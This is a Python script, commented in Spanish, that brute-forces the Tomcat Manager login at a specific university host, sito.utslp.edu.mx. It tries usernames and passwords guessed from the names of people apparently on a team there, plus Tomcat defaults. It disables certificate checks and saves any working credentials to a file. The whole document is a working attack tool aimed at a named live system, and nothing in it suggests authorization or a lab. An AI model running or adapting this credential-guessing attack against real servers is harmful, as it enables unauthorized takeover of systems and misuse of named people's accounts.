#!/usr/bin/env python3
import requests
from requests.auth import HTTPBasicAuth
import sys

requests.packages.urllib3.disable_warnings()

# Usuarios y contraseñas basados en el equipo SITO
users = [
    'jose', 'tono', 'garcia', 'josetono', 'josegarcia', 'tonogarcia',
    'isra', 'ramirez', 'israramirez', 
    'juanjo', 'muniz', 'juanjomuniz',
    'danyel', 'sp', 'danyelsp',
    'admin', 'tomcat', 'manager', 'sito', 'SITO'
]

passwords = [
    'jose', 'tono', 'garcia', 'Jose2024', 'Tono2024', 'Garcia2024', 'SITO2024',
    'sito', 'SITO', 'isra', 'ramirez', 'Isra2024', 'juanjo', 'muniz', 'Juanjo2024',
    'danyel', 'Danyel2024', 'password', 'tomcat', 'admin', 'manager', 's3cret',
    '123456', 'jose123', 'tono123', 'sito123', 'admin123', 'tomcat6', 'tomcat6.0'
]

url = 'https://sito.utslp.edu.mx/manager/html'

print("🔍 Iniciando fuerza bruta al Tomcat Manager...")

for user in users:
    for password in passwords:
        try:
            response = requests.get(url, auth=HTTPBasicAuth(user, password), verify=False, timeout=10)
            
            if response.status_code == 200:
                print(f'🎉 ✅ CREDENCIALES ENCONTRADAS: {user}:{password}')
                print(f'   URL: {url}')
                with open('credenciales_encontradas.txt', 'w') as f:
                    f.write(f'{user}:{password}\n')
                sys.exit(0)
            elif response.status_code == 401:
                print(f'❌ Falló: {user}:{password}')
            else:
                print(f'⚠️  Estado inesperado {response.status_code}: {user}:{password}')
                
        except Exception as e:
            print(f'💥 Error con {user}:{password} - {e}')

print("❌ No se encontraron credenciales válidas")